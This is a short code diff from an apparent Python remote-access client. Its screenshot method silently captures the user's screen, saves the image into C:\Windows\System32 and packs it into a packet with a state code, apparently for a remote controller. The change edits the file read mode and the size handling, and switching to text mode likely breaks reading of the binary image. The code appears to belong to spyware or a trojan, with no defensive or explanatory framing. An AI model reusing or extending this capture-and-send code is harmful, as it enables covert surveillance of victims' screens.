@@ -55,11 +55,11 @@ class Client:
 
     def screenshot(self,pkt):
         ImageGrab.grab().save("C:\Windows\System32\scrnsht.png", "png")
-        f = open('C:\Windows\System32\scrnsht.png', 'rb')
+        f = open('C:\Windows\System32\scrnsht.png', 'r')
         fread = f.read()
         f.close()
         state = "143"
-        size = str(len(fread))
+        size = len(fread)
         data = fread
 
         pkt.state = state
